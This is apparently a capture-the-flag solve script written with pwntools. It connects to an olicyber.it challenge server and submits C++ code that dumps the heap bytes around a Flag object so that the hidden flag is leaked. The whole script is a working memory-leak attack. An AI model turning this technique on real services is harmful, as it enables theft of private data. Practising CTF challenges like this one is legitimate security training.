from pwn import *

r = remote("privatedata.challs.olicyber.it", 12300)

r.recvuntil(b"EOF\n")

r.sendline(b'#include <stdio.h>\n#include <cstdlib>\nint main() {\nvoid* heap_before = malloc(1); // Allocate a small amount of memory\nFlag myFlag;\nvoid* heap_after = malloc(1);\nfor (int i = 0; i < (long)heap_after-(long)heap_before; i++){\nprintf("%c", *((char*)heap_before + i));\n}\nreturn 0;\n}\nEOF')
r.recvline()
print(r.recvline())